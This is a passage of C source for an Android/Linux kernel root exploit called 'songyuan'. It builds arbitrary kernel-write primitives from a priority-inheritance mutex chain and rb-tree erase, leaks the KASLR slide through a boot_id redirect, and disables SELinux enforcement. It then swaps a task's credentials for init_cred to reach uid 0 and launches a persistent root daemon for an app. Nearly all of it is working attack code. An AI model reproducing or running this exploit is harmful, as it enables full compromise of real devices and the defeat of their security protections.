#include "common.h"

#include <linux/perf_event.h>

/* Minimal songyuan proof.  No ashmem/configfs/SystemUI stages are linked. */
uint32_t f_wait;
uint32_t f_pi_target;
uint32_t f_pi_chain;
atomic_int waiter_ready;
atomic_int waiter_waiting;
atomic_int owner_started;
atomic_int owner_chain_done;
atomic_int route_done;
atomic_int waiter_tid;
atomic_int punch_consume_go;
atomic_int punch_consume_stop;
atomic_int consumer_calls;
atomic_int consumer_success;
atomic_int main_route_delay_usec;
atomic_int cfi_stage_done;
atomic_int pipe_prepare_request;
atomic_int pipe_prepare_done;
atomic_int fake_fops_request;
atomic_int fake_fops_done;
int memfd_leak;

int kaslr_done;
uint64_t kaslr_base;
uint64_t kaslr_slide;
uint64_t slide_bootid_before;
uint64_t slide_bootid_after;
uint64_t slide_bootid_want;
ssize_t slide_bootid_restore_ret;

#define EXP_BUF_NWORDS 16
#define KASLR_SLIDE_MAX 0x3f00000000ULL
#define PAGE_WORKER_SPARES 4
#define CRED_ATTEMPTS 2

static atomic_int control_uid;
static atomic_int control_gid;
static int control_ready_pipe[2] = {-1, -1};
static char original_boot_id[64];
static uint64_t original_boot_id_words[2];
static int boot_id_needs_restore;
static uintptr_t selinux_bool_word;
static size_t active_page_worker = SIZE_MAX;
static size_t write_page_count;
static struct songyuan_page_result redirect_pages[8];
static size_t redirect_page_count;
static size_t redirect_page_next;

struct leader_proof_shared {
  atomic_int task_ready;
  atomic_uintptr_t task;
  atomic_int check_seq;
  atomic_int checked_seq;
  atomic_int done;
  atomic_int finish;
  atomic_int uid;
  atomic_int gid;
  atomic_int daemon_started;
  atomic_int daemon_pid;
  atomic_int daemon_result;
  atomic_int daemon_errno;
  atomic_int ashmem_alias_ready;
  atomic_int ashmem_alias_errno;
  atomic_int app_uid;
};

int tickerbar_start_daemon(uid_t app_uid);
int tickerbar_daemon_available(void);
static int read_boot_id_text(char out[64]);

enum {
  EXP_W_TREE_PC = 0,
  EXP_W_TREE_RIGHT = 1,
  EXP_W_TREE_LEFT = 2,
  EXP_W_TREE_PRIO = 3,
  EXP_W_TREE_DEADLINE = 4,
  EXP_W_PI_TREE_PC = 5,
  EXP_W_PI_TREE_RIGHT = 6,
  EXP_W_PI_TREE_LEFT = 7,
  EXP_W_PI_TREE_PRIO = 8,
  EXP_W_PI_TREE_DEADLINE = 9,
  EXP_W_TASK = 10,
  EXP_W_LOCK = 11,
  EXP_W_WAKE_STATE = 12,
  EXP_W_WW_CTX = 13,
};

static int kernel_ptr(uint64_t value) {
  return (value >> 48) == 0xffff;
}

static void abort_control_child(pid_t pid) {
  if (pid <= 0)
    return;
  (void)kill(pid, SIGKILL);
  while (waitpid(pid, NULL, 0) < 0 && errno == EINTR) {}
}

static int read_enforcing_state(void) {
  char value = '?';
  int fd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
  if (fd < 0)
    return -1;
  ssize_t n = read(fd, &value, 1);
  close(fd);
  return n == 1 && value == '0' ? 0 : n == 1 && value == '1' ? 1 : -1;
}

/* Android's libcutils opens /dev/ashmem<boot-id>.  The boot_id pointer
 * restore primitive necessarily changes the UUID's second qword, so without
 * a matching device alias every newly started app fails in framework setup.
 * The rooted proof child runs in the kernel SELinux domain and creates the
 * alias before the long-lived daemon is exposed to the app. */
static int ensure_ashmem_boot_alias(void) {
  char boot_id[64];
  if (!read_boot_id_text(boot_id))
    return 0;

  char path[128];
  int path_len = snprintf(path, sizeof(path), "/dev/ashmem%s", boot_id);
  if (path_len <= 0 || (size_t)path_len >= sizeof(path)) {
    errno = ENAMETOOLONG;
    return 0;
  }

  struct stat base;
  struct stat alias;
  if (stat("/dev/ashmem", &base) != 0 || !S_ISCHR(base.st_mode))
    return 0;
  if (stat(path, &alias) == 0)
    return S_ISCHR(alias.st_mode) && alias.st_rdev == base.st_rdev;

  if (symlink("/dev/ashmem", path) != 0 && errno != EEXIST)
    return 0;
  if (stat(path, &alias) != 0 || !S_ISCHR(alias.st_mode) ||
      alias.st_rdev != base.st_rdev) {
    errno = ENODEV;
    return 0;
  }
  return 1;
}

static void build_write_buffer(uint64_t *buf, uintptr_t target,
                               uintptr_t value, int write_shape) {
  memset(buf, 0, EXP_BUF_NWORDS * sizeof(*buf));
  if (write_shape == 1) {
    /* rb_erase(parent=target-8, right=value) writes value to target.  Its
     * collateral store lands in value[0], which is acceptable only for the
     * static init_cred usage counter used by the final proof. */
    buf[EXP_W_TREE_PC] = target - 8;
    buf[EXP_W_TREE_RIGHT] = value;
    buf[EXP_W_TREE_LEFT] = 0;
  } else {
    /* rb_erase(parent=value, left=target) writes value to target. */
    buf[EXP_W_TREE_PC] = value;
    buf[EXP_W_TREE_RIGHT] = 0;
    buf[EXP_W_TREE_LEFT] = target;
  }
  buf[EXP_W_TREE_PRIO] = 130;
  buf[EXP_W_TREE_DEADLINE] = 0;
  if (write_shape == 2) {
    /* The chain erases waiter->pi_tree_entry after tree_entry.  Use that
     * second, parentless left-child erase to write zero to init_cred's
     * uid/gid word, undoing the primary left-child erase's collateral in
     * the same sched_setattr invocation. */
    buf[EXP_W_PI_TREE_PC] = 0;
    buf[EXP_W_PI_TREE_RIGHT] = 0;
    buf[EXP_W_PI_TREE_LEFT] = value + 8;
    buf[EXP_W_PI_TREE_PRIO] = 130;
    buf[EXP_W_PI_TREE_DEADLINE] = 0;
  }
  /* 6.12 try_to_wake_up() takes waiter->task->pi_lock before checking
   * __state.  A synthetic task can therefore wedge queued_spin_lock even
   * with state==0.  Before the slide is known, use init_task's stable
   * direct-map alias; afterward use its canonical runtime address. */
  buf[EXP_W_TASK] = kaslr_done
                        ? (uintptr_t)(kaslr_base + INIT_TASK_OFF)
                        : (uintptr_t)P0_DATA_ALIAS_CONST(INIT_TASK);
  buf[EXP_W_LOCK] = fake_lock;
  buf[EXP_W_WAKE_STATE] = 0;
  buf[EXP_W_WW_CTX] = 0;
}

static int prepare_redirect_pages(size_t count) {
  if (count > sizeof(redirect_pages) / sizeof(redirect_pages[0]))
    return 0;
  redirect_page_count = 0;
  redirect_page_next = 0;
  while (redirect_page_count < count) {
    struct songyuan_page_result selected;
    memset(&selected, 0, sizeof(selected));
    if (!songyuan_page_worker_acquire(&selected))
      return 0;
    int duplicate = 0;
    for (size_t prior = 0; prior < redirect_page_count; ++prior) {
      if (redirect_pages[prior].page == selected.page) {
        duplicate = 1;
        break;
      }
    }
    if (duplicate) {
      pr_warning("songyuan duplicate redirect page=%016zx; retrying\n",
                 selected.page);
      songyuan_page_worker_release(selected.worker_index);
      continue;
    }
    redirect_pages[redirect_page_count++] = selected;
    pr_success("songyuan-redirect-page-staged index=%zu/%zu worker=%zu "
               "page=%016zx lock=%016zx task=%016zx\n",
               redirect_page_count, count, selected.worker_index,
               selected.page, selected.lock, selected.task);
  }
  return 1;
}

static int select_write_page(const char *stage) {
  const int needs_selinux_word = strcmp(stage, "selinux-disable") == 0;
  for (;;) {
    struct songyuan_page_result selected;
    if (redirect_page_next < redirect_page_count) {
      selected = redirect_pages[redirect_page_next++];
    } else {
      memset(&selected, 0, sizeof(selected));
      if (!songyuan_page_worker_acquire(&selected)) {
        pr_error("songyuan page preparation failed stage=%s used=%zu\n",
                 stage, write_page_count);
        return 0;
      }
    }
    write_page_count++;
    if (needs_selinux_word && (selected.page & 0xffffU) != 0) {
      pr_info("songyuan SELinux page unsuitable page=%016zx; retrying\n",
              selected.page);
      songyuan_page_worker_release(selected.worker_index);
      continue;
    }
    page_base = selected.page;
    fake_lock = selected.lock;
    fake_task = selected.task;
    active_page_worker = selected.worker_index;
    if (needs_selinux_word) {
      /* rb_erase's primary store is eight bytes wide.  selinux_state begins
       * with bool enforcing, bool initialized, then policycap booleans.  A
       * pinned direct-map address ending in 0x0100 makes enforcing=false and
       * initialized=true.  Shape 2 repairs the collateral at value+8. */
      selinux_bool_word = page_base + 0x100;
      pr_info("songyuan SELinux bool word=%016zx backing-page=%016zx\n",
              selinux_bool_word, page_base);
    }
    pr_info("songyuan-page-selected stage=%s worker=%zu page=%016zx "
            "lock=%016zx task=%016zx\n",
            stage, active_page_worker, page_base, fake_lock, fake_task);
    return 1;
  }
}

static int kernel_write64_once_shape(uintptr_t target, uintptr_t value,
                                     const char *stage,
                                     int write_shape) {
  if (!select_write_page(stage))
    return 0;

  if (strcmp(stage, "selinux-disable") == 0)
    value = selinux_bool_word;

  uint64_t buf[EXP_BUF_NWORDS];
  build_write_buffer(buf, target, value, write_shape);
  pr_info("songyuan write stage=%s target=%016zx value=%016zx page=%016zx "
          "waiter_task=%016llx lock=%016zx\n",
          stage, target, value, page_base,
          (unsigned long long)buf[EXP_W_TASK], fake_lock);
  /* The chain walk mutates the fake lock/task state.  Every staged page is
   * one-shot even when the native child reports failure. */
  int ret = exp_stack_once(buf);
  songyuan_page_worker_release(active_page_worker);
  active_page_worker = SIZE_MAX;
  if (ret != 0) {
    pr_error("songyuan write stage=%s failed ret=%d errno=%d\n",
             stage, ret, errno);
    return 0;
  }
  return 1;
}

static int kernel_write64_once(uintptr_t target, uintptr_t value,
                               const char *stage) {
  return kernel_write64_once_shape(target, value, stage, 0);
}

static int read_bootid_words(uint64_t words[2]) {
  char text[80];
  unsigned char raw[16];
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd < 0)
    return 0;
  ssize_t n = read(fd, text, sizeof(text) - 1);
  int saved_errno = errno;
  close(fd);
  if (n <= 0) {
    errno = saved_errno;
    return 0;
  }
  text[n] = 0;

  int high = -1;
  int out = 0;
  for (ssize_t i = 0; i < n && out < 16; i++) {
    int v;
    if (text[i] >= '0' && text[i] <= '9')
      v = text[i] - '0';
    else if (text[i] >= 'a' && text[i] <= 'f')
      v = text[i] - 'a' + 10;
    else if (text[i] >= 'A' && text[i] <= 'F')
      v = text[i] - 'A' + 10;
    else
      continue;
    if (high < 0)
      high = v;
    else {
      raw[out++] = (unsigned char)((high << 4) | v);
      high = -1;
    }
  }
  if (out != 16)
    return 0;
  memcpy(words, raw, sizeof(raw));
  return 1;
}

static int read_boot_id_text(char out[64]) {
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd < 0)
    return 0;
  ssize_t n = read(fd, out, 63);
  int saved_errno = errno;
  close(fd);
  if (n <= 0) {
    errno = saved_errno;
    return 0;
  }
  while (n > 0 && (out[n - 1] == '\n' || out[n - 1] == '\r'))
    --n;
  out[n] = '\0';
  if (n != 36)
    return 0;
  for (int i = 0; i < 36; ++i) {
    if (i == 8 || i == 13 || i == 18 || i == 23) {
      if (out[i] != '-')
        return 0;
    } else if (!((out[i] >= '0' && out[i] <= '9') ||
                 (out[i] >= 'a' && out[i] <= 'f') ||
                 (out[i] >= 'A' && out[i] <= 'F'))) {
      return 0;
    }
  }
  return 1;
}

static int restore_boot_id_pointer_once(void) {
  if (!kaslr_done) {
    pr_error("songyuan cannot restore boot_id before KASLR is known\n");
    return 0;
  }
  uintptr_t target = SLIDE_RANDOM_BOOT_ID_DATA;
  uintptr_t canonical_boot_id = slide_canon_addr(SLIDE_SYSCTL_BOOTID);
  int write_ok = kernel_write64_once(target, canonical_boot_id,
                                     "bootid-restore");
  char restored[64] = {0};
  uint64_t restored_words[2] = {0, 0};
  int text_ok = read_boot_id_text(restored);
  int words_ok = read_bootid_words(restored_words);
  /* The left-child rb_erase shape necessarily stores its target address at
   * value+8 as collateral.  For this write, value is sysctl_bootid: its first
   * qword remains the boot UUID's original first half and its second becomes
   * random_table[boot_id].data.  Checking that exact pair proves the pointer
   * reached the intended canonical buffer instead of accepting arbitrary
   * task/logger bytes merely because procfs formats every 16-byte UUID. */
  /* A recovery run can start while boot_id.data is still redirected, in
   * which case original_boot_id_words[0] is the logger pointer rather than
   * the UUID prefix.  Pointer restoration is nevertheless unambiguous: the
   * canonical buffer's first qword is UUID data (not a kernel pointer), and
   * the primitive's required collateral makes its second qword exactly the
   * bootid_data target. */
  int verified = text_ok && words_ok && !kernel_ptr(restored_words[0]) &&
                 restored_words[1] == target;
  if (!verified) {
    pr_error("songyuan boot_id restore FAILED write_ok=%d original=%s "
             "actual=%s words=%016llx/%016llx expected=%016llx/%016zx "
             "pointer=%016zx\n",
             write_ok, original_boot_id, restored[0] ? restored : "<invalid>",
             (unsigned long long)restored_words[0],
             (unsigned long long)restored_words[1],
             (unsigned long long)original_boot_id_words[0], target,
             canonical_boot_id);
    return 0;
  }
  pr_success("songyuan-bootid-pointer-restored write_ok=%d baseline=%s "
             "current=%s pointer=%016zx collateral=%016zx\n",
             write_ok, original_boot_id, restored, canonical_boot_id, target);
  return 1;
}

static int restore_boot_id_pointer(void) {
  /* Never re-fire a state-changing PI primitive after ambiguous readback.
   * A worker exit only proves that the route completed; it does not prove
   * where the rb-tree store landed. */
  return restore_boot_id_pointer_once();
}

static int accept_kaslr_words(const uint64_t words[2], const char *source) {
  if (!kernel_ptr(words[0]) || words[0] < SLIDE_NFULNL_LOGGER_IMAGE)
    return 0;
  uint64_t slide = words[0] - SLIDE_NFULNL_LOGGER_IMAGE;
  if ((slide & 0x1fffffULL) != 0 || slide > KASLR_SLIDE_MAX) {
    pr_error("songyuan kaslr slide rejected source=%s leaked=%016llx "
             "slide=%016llx\n",
             source, (unsigned long long)words[0],
             (unsigned long long)slide);
    return 0;
  }
  kaslr_slide = slide;
  kaslr_base = KIMAGE_TEXT_BASE + slide;
  kaslr_done = 1;
  slide_p0_offset = slide;
  boot_id_needs_restore = 1;
  pr_success("songyuan-kaslr-ok source=%s leaked=%016llx base=%016llx "
             "slide=%016llx\n",
             source, (unsigned long long)words[0],
             (unsigned long long)kaslr_base,
             (unsigned long long)kaslr_slide);
  return 1;
}

static int leak_kaslr(void) {
  uint64_t words[2];
  const char *slide_env = getenv("SONGYUAN_KASLR_SLIDE");
  if (slide_env && *slide_env) {
    char *end = NULL;
    errno = 0;
    unsigned long long slide = strtoull(slide_env, &end, 0);
    if (errno || end == slide_env || *end != '\0' ||
        (slide & 0x1fffffULL) != 0 || slide > KASLR_SLIDE_MAX) {
      pr_error("songyuan invalid SONGYUAN_KASLR_SLIDE=%s\n", slide_env);
      return 0;
    }
    kaslr_slide = (uint64_t)slide;
    kaslr_base = KIMAGE_TEXT_BASE + kaslr_slide;
    kaslr_done = 1;
    slide_p0_offset = kaslr_slide;
    pr_success("songyuan-kaslr-ok source=environment base=%016llx "
               "slide=%016llx\n",
               (unsigned long long)kaslr_base,
               (unsigned long long)kaslr_slide);
    return 1;
  }
  /* A prior proof on this boot may already have redirected boot_id.data to
   * &loggers[2][1].  Reuse that exact pointer and preserve the fresh write
   * page for the next stage. */
  if (read_bootid_words(words) && accept_kaslr_words(words, "existing"))
    return 1;

  uintptr_t bootid_data = SLIDE_RANDOM_BOOT_ID_DATA;
  /* &loggers[2][1] = (&loggers[0][1]) + 0x20. */
  uintptr_t logger_slot = SLIDE_LOGGERS_0_1 + 0x20;
  /* The primary erase also stores bootid_data at logger_slot+8.  That
   * adjacent slot is zero in the exact image; use the parentless secondary
   * erase to restore it before this transaction returns. */
  int write_ok = kernel_write64_once_shape(bootid_data, logger_slot,
                                           "kaslr", 2);
  memset(words, 0, sizeof(words));
  if (!read_bootid_words(words)) {
    pr_error("songyuan kaslr read invalid write_ok=%d first=%016llx "
             "second=%016llx\n", write_ok,
             (unsigned long long)words[0], (unsigned long long)words[1]);
  } else if (accept_kaslr_words(
                 words, write_ok ? "write" : "write-side-effect")) {
    return 1;
  } else {
    pr_error("songyuan kaslr stage produced no valid pointer write_ok=%d "
             "words=%016llx/%016llx; refusing retry\n",
             write_ok, (unsigned long long)words[0],
             (unsigned long long)words[1]);
  }
  return 0;
}

static uintptr_t perf_find_current_task(void) {
  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.type = PERF_TYPE_SOFTWARE;
  pe.size = sizeof(pe);
  pe.config = PERF_COUNT_SW_CPU_CLOCK;
  pe.sample_period = 5000;
  pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
  pe.sample_regs_intr = (1ULL << 32) - 1;
  pe.disabled = 1;
  pe.exclude_user = 1;
  pe.exclude_hv = 1;
  pe.exclude_idle = 1;

  int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
  if (fd < 0) {
    pr_warning("songyuan perf_event_open errno=%d\n", errno);
    return 0;
  }
  const size_t page_size = 4096;
  const size_t data_size = page_size * 32;
  const size_t map_size = page_size + data_size;
  void *mapping = mmap(NULL, map_size, PROT_READ | PROT_WRITE,
                       MAP_SHARED, fd, 0);
  if (mapping == MAP_FAILED) {
    pr_warning("songyuan perf mmap errno=%d\n", errno);
    close(fd);
    return 0;
  }
  (void)ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  for (int i = 0; i < 500000; ++i)
    (void)syscall(__NR_getpid);
  (void)ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

  struct perf_event_mmap_page *header = mapping;
  uint64_t head = header->data_head;
  atomic_thread_fence(memory_order_acquire);
  unsigned char *base = (unsigned char *)mapping + page_size;
  uint64_t pos = header->data_tail;
  uintptr_t candidates[256];
  int candidate_count = 0;
  while (pos < head && candidate_count < 256) {
    size_t ring_off = (size_t)(pos % data_size);
    if (ring_off + sizeof(struct perf_event_header) > data_size)
      break;
    struct perf_event_header *event =
        (struct perf_event_header *)(base + ring_off);
    if (event->size < sizeof(*event) || ring_off + event->size > data_size)
      break;
    if (event->type == PERF_RECORD_SAMPLE) {
      unsigned char *cursor = (unsigned char *)event + sizeof(*event) + 8;
      unsigned char *end = (unsigned char *)event + event->size;
      if (cursor + 8 + 32 * sizeof(uint64_t) <= end) {
        uint64_t abi;
        memcpy(&abi, cursor, sizeof(abi));
        cursor += 8;
        if (abi == PERF_SAMPLE_REGS_ABI_32 ||
            abi == PERF_SAMPLE_REGS_ABI_64) {
          for (int reg = 0; reg < 32 && candidate_count < 256; ++reg) {
            uint64_t value;
            memcpy(&value, cursor + reg * sizeof(value), sizeof(value));
            value |= 0x0fULL << 56;
            if (value >= DIRECT_MAP_BASE && value < DIRECT_MAP_END)
              candidates[candidate_count++] = (uintptr_t)value;
          }
        }
      }
    }
    pos += event->size;
  }
  header->data_tail = head;
  munmap(mapping, map_size);
  close(fd);

  uintptr_t best = 0;
  int best_votes = 0;
  for (int i = 0; i < candidate_count; ++i) {
    int votes = 0;
    for (int j = 0; j < candidate_count; ++j)
      votes += candidates[i] == candidates[j];
    if (votes > best_votes) {
      best = candidates[i];
      best_votes = votes;
    }
  }
  pr_info("songyuan perf task=%016zx votes=%d/%d\n",
          best, best_votes, candidate_count);
  return best_votes >= 2 ? best : 0;
}

static int valid_task_ptr(uintptr_t task) {
  return task >= DIRECT_MAP_BASE && task < DIRECT_MAP_END &&
         (task & 0x3fU) == 0;
}

static int root_control_thread(void) {
  /* The old task-tail redirect was the panic source.  Restore boot_id first,
   * disable SELinux with one verified write, then use the kernel's perf sample
   * registers to identify a dedicated victim task without changing any list. */
  if (boot_id_needs_restore && !restore_boot_id_pointer())
    return 0;
  boot_id_needs_restore = 0;

  if (read_enforcing_state() != 0) {
    if (!prepare_redirect_pages(1))
      return 0;
    uintptr_t enforcing = (uintptr_t)(kaslr_base + SELINUX_ENFORCING_OFF);
    if (!kernel_write64_once_shape(enforcing, 0, "selinux-disable", 2))
      return 0;
    int state = read_enforcing_state();
    pr_success("songyuan-selinux-write target=%016zx value=%016zx state=%d\n",
               enforcing, selinux_bool_word, state);
    if (state != 0)
      return 0;
  }

  struct leader_proof_shared *shared = mmap(
      NULL, sizeof(*shared), PROT_READ | PROT_WRITE,
      MAP_SHARED | MAP_ANONYMOUS, -1, 0);
  if (shared == MAP_FAILED || pipe(control_ready_pipe) != 0)
    return 0;
  memset(shared, 0, sizeof(*shared));

  int daemon_mode = getenv("TICKERBAR_DAEMON") != NULL;
  if (daemon_mode) {
    const char *uid_env = getenv("TICKERBAR_ALLOWED_UID");
    char *end = NULL;
    errno = 0;
    unsigned long uid_value = uid_env ? strtoul(uid_env, &end, 10) : 0;
    if (!uid_env || errno || end == uid_env || *end != '\0' ||
        uid_value < 10000 || uid_value > UINT32_MAX) {
      pr_error("songyuan invalid TICKERBAR_ALLOWED_UID\n");
      return 0;
    }
    atomic_store(&shared->app_uid, (int)uid_value);
  }

  pid_t control_pid = fork();
  if (control_pid < 0)
    return 0;
  if (control_pid == 0) {
    close(control_ready_pipe[0]);
    (void)prctl(PR_SET_PDEATHSIG, SIGKILL);
    if (getppid() == 1)
      _exit(1);
    (void)prctl(PR_SET_NAME, "glproof", 0, 0, 0);
    reset_cpu_pin();

    uintptr_t first = perf_find_current_task();
    uintptr_t second = first ? perf_find_current_task() : 0;
    uintptr_t task = first == second && valid_task_ptr(first) ? first : 0;
    atomic_store(&shared->task, task);
    atomic_store(&shared->task_ready, 1);
    char token = task ? 'R' : 'F';
    (void)write(control_ready_pipe[1], &token, 1);

    int seen = 0;
    uid_t uid = (uid_t)-1;
    gid_t gid = (gid_t)-1;
    while (!atomic_load(&shared->finish)) {
      int seq = atomic_load(&shared->check_seq);
      if (!seq || seq == seen) {
        usleep(1000);
        continue;
      }
      seen = seq;
      uid = (uid_t)syscall(SYS_getuid);
      gid = (gid_t)syscall(SYS_getgid);
      atomic_store(&shared->uid, (int)uid);
      atomic_store(&shared->gid, (int)gid);
      atomic_store(&shared->checked_seq, seq);
      if (uid == 0 && gid == 0)
        break;
    }
    if (uid != 0 || gid != 0)
      _exit(1);

    errno = 0;
    int ashmem_alias_ready = ensure_ashmem_boot_alias();
    atomic_store(&shared->ashmem_alias_ready, ashmem_alias_ready);
    atomic_store(&shared->ashmem_alias_errno,
                 ashmem_alias_ready ? 0 : errno);
    if (daemon_mode && ashmem_alias_ready) {
      pid_t daemon_pid = fork();
      if (daemon_pid == 0) {
        (void)setsid();
        (void)prctl(PR_SET_NAME, "tickerbar-root", 0, 0, 0);
        int nullfd = open("/dev/null", O_RDWR | O_CLOEXEC);
        if (nullfd >= 0) {
          dup2(nullfd, STDIN_FILENO);
          dup2(nullfd, STDOUT_FILENO);
          dup2(nullfd, STDERR_FILENO);
        }
        for (int fd = 3; fd < 65536; ++fd)
          close(fd);
        errno = 0;
        int daemon_result = tickerbar_start_daemon(
            (uid_t)atomic_load(&shared->app_uid));
        atomic_store(&shared->daemon_result, daemon_result);
        atomic_store(&shared->daemon_errno, errno);
        _exit(daemon_result == 0 ? 0 : 1);
      }
      atomic_store(&shared->daemon_pid, (int)daemon_pid);
      for (int i = 0; i < 1000; ++i) {
        if (tickerbar_daemon_available()) {
          atomic_store(&shared->daemon_started, 1);
          break;
        }
        usleep(10000);
      }
    }
    (void)prctl(PR_SET_PDEATHSIG, 0);
    atomic_store(&shared->done, 1);
    for (;;)
      pause();
  }

  close(control_ready_pipe[1]);
  char ready = 0;
  if (read(control_ready_pipe[0], &ready, 1) != 1 || ready != 'R') {
    pr_error("songyuan perf task discovery failed\n");
    abort_control_child(control_pid);
    return 0;
  }
  uintptr_t task = atomic_load(&shared->task);
  if (!atomic_load(&shared->task_ready) || !valid_task_ptr(task)) {
    abort_control_child(control_pid);
    return 0;
  }
  pr_success("songyuan-task-perf task=%016zx pid=%d\n", task, control_pid);

  /* Match upstream's bounded W2 arm: point task->cred at init_cred's stable
   * direct-map alias and use the right-child erase.  The former left-child
   * arm made init_cred itself the synthetic rb parent; on this 6.12 build the
   * consumer never returned from that traversal. */
  uintptr_t init_cred = (uintptr_t)P0_DATA_ALIAS_CONST(INIT_CRED);
  int rooted = 0;
  for (int attempt = 1; attempt <= CRED_ATTEMPTS && !rooted; ++attempt) {
    if (!prepare_redirect_pages(1))
      break;
    char stage[32];
    snprintf(stage, sizeof(stage), "cred-switch-%d", attempt);
    if (!kernel_write64_once_shape(task + TASK_CRED_OFF, init_cred,
                                   stage, 1))
      break;

    atomic_store(&shared->check_seq, attempt);
    for (int i = 0; i < 10000 &&
                        atomic_load(&shared->checked_seq) != attempt; ++i)
      usleep(1000);
    rooted = atomic_load(&shared->checked_seq) == attempt &&
             atomic_load(&shared->uid) == 0 &&
             atomic_load(&shared->gid) == 0;
    pr_info("songyuan cred verify attempt=%d rooted=%d uid=%d gid=%d\n",
            attempt, rooted, atomic_load(&shared->uid),
            atomic_load(&shared->gid));
  }

  if (!rooted) {
    atomic_store(&shared->finish, 1);
    abort_control_child(control_pid);
    return 0;
  }
  for (int i = 0; i < 100000 && !atomic_load(&shared->done); ++i)
    usleep(100);

  int proof_done = atomic_load(&shared->done);
  int daemon_started = atomic_load(&shared->daemon_started);
  int ashmem_alias_ready = atomic_load(&shared->ashmem_alias_ready);
  int success = proof_done && ashmem_alias_ready &&
                (!daemon_mode || daemon_started);
  atomic_store(&control_uid, atomic_load(&shared->uid));
  atomic_store(&control_gid, atomic_load(&shared->gid));
  pr_success("songyuan-root-proof rooted=%d uid=%d gid=%d victim=%d "
             "daemon=%d daemon_pid=%d daemon_result=%d daemon_errno=%d "
             "ashmem_alias=%d ashmem_alias_errno=%d\n",
             success, atomic_load(&shared->uid), atomic_load(&shared->gid),
             control_pid, daemon_started, atomic_load(&shared->daemon_pid),
             atomic_load(&shared->daemon_result),
             atomic_load(&shared->daemon_errno), ashmem_alias_ready,
             atomic_load(&shared->ashmem_alias_errno));
  return success;
}

int run_exploit(int argc, char **argv) {
  (void)argc;
  (void)argv;
  /* Defense in depth for packaged builds.  The Android UI currently keeps
   * root attempts disabled, but the native library must also be inert if it
   * is invoked directly or by a stale launcher.  Deliberate test commands
   * can arm one process explicitly after the page-reclaim design is ready. */
  const char *armed = getenv("TICKERBAR_ROOT_ARMED");
  if (!armed || strcmp(armed, "1") != 0) {
    pr_error("songyuan root module is safety-locked; "
             "TICKERBAR_ROOT_ARMED=1 is required\n");
    return 2;
  }
  disable_rseq_for_thread();
  set_limit();
  log_startup_context();
  unsigned int timeout_sec = 1200;
  const char *timeout_env = getenv("TICKERBAR_ROOT_TIMEOUT_SEC");
  if (timeout_env && *timeout_env) {
    char *end = NULL;
    errno = 0;
    unsigned long parsed = strtoul(timeout_env, &end, 10);
    if (!errno && end != timeout_env && *end == '\0' &&
        parsed >= 60 && parsed <= 3600)
      timeout_sec = (unsigned int)parsed;
  }
  alarm(timeout_sec);
  pr_info("songyuan safety timeout=%u seconds\n", timeout_sec);
  pin_to_core(CORE);

  int slide_only = getenv("SLIDE_ONLY") != NULL;
  int repair_only = getenv("REPAIR_INIT_CRED") != NULL;
  const char *provided_slide = getenv("SONGYUAN_KASLR_SLIDE");
  int needs_slide_write = !provided_slide || !*provided_slide;
  size_t stage_count = slide_only ? (needs_slide_write ? 2 : 1) :
      repair_only ? (needs_slide_write ? 3 : 1) :
      (needs_slide_write ? 5 : 3);

  /* Fork every native stage while this process still has a pristine file
   * table.  After the first kernel writes, starting another child can make
   * copy_process()/dup_fd() traverse corrupted state and panic the kernel.
   * Workers receive their dynamic payload later through private pipes. */
  if (!songyuan_native_workers_prepare(stage_count)) {
    pr_error("songyuan refusing to start: native worker setup failed\n");
    return 1;
  }

  size_t page_worker_count = stage_count + PAGE_WORKER_SPARES;
  if (!songyuan_page_workers_prepare(page_worker_count)) {
    pr_error("songyuan refusing to start: page worker setup failed\n");
    return 1;
  }

  if (getenv("TICKERBAR_WORKER_SELFTEST")) {
    uint64_t test_payload[EXP_BUF_NWORDS] = {0};
    for (size_t i = 0; i < stage_count; ++i) {
      test_payload[0] = i;
      if (exp_stack_once(test_payload) != 0) {
        pr_error("songyuan worker self-test failed index=%zu\n", i);
        return 1;
      }
    }
    pr_success("songyuan-worker-self-test passed=%zu\n", stage_count);
    return 0;
  }

  if (getenv("TICKERBAR_PAGE_WORKER_SELFTEST")) {
    struct songyuan_page_result prepared;
    memset(&prepared, 0, sizeof(prepared));
    int ok = songyuan_page_worker_acquire(&prepared);
    if (ok) {
      ok = prepared.lock == prepared.page + 0x4a0 &&
           prepared.task == prepared.page + 0x2380 &&
           prepared.reclaim_sent == prepared.reclaim_want;
      songyuan_page_worker_release(prepared.worker_index);
    }
    pr_success("songyuan-page-worker-self-test passed=%d page=%016zx "
               "lock=%016zx task=%016zx sends=%d/%d\n",
               ok, prepared.page, prepared.lock, prepared.task,
               prepared.reclaim_sent, prepared.reclaim_want);
    return ok ? 0 : 1;
  }

  if (!read_boot_id_text(original_boot_id)) {
    pr_error("songyuan refusing to start: boot_id is not a valid UUID\n");
    return 1;
  }
  if (!read_bootid_words(original_boot_id_words)) {
    pr_error("songyuan refusing to start: cannot decode boot_id words\n");
    return 1;
  }
  pr_success("songyuan-bootid-baseline uuid=%s\n", original_boot_id);

  /* Page reclaim is deliberately not run while boot_id.data is redirected:
   * Android derives its randomized ashmem device name from boot_id, and a
   * long reclaim with the pointer redirected caused the observed global
   * splash-screen/ANR storm.  Only the compact redirect chain is staged now
   * while boot_id is canonical.  Once restore_boot_id_pointer() completes,
   * credential and SELinux pages are prepared just in time by the preforked
   * helpers, eliminating the long stale-page window from the last panic. */
  size_t redirect_count = needs_slide_write ? 2 : 0;
  if (redirect_count && !prepare_redirect_pages(redirect_count)) {
    pr_error("songyuan redirect-page preparation failed count=%zu\n",
             redirect_count);
    return 1;
  }

  if (!leak_kaslr())
    return 1;
  if (repair_only) {
    uintptr_t init_cred = (uintptr_t)(kaslr_base + INIT_CRED_OFF);
    int restored = !boot_id_needs_restore || restore_boot_id_pointer();
    boot_id_needs_restore = 0;
    if (restored && !prepare_redirect_pages(1))
      restored = 0;
    int repaired = restored && kernel_write64_once_shape(
        init_cred + 8, 0, "repair-init-cred-uidgid", 1);
    pr_success("songyuan-init-cred-repair repaired=%d target=%016zx\n",
               repaired, init_cred + 8);
    return repaired ? 0 : 1;
  }
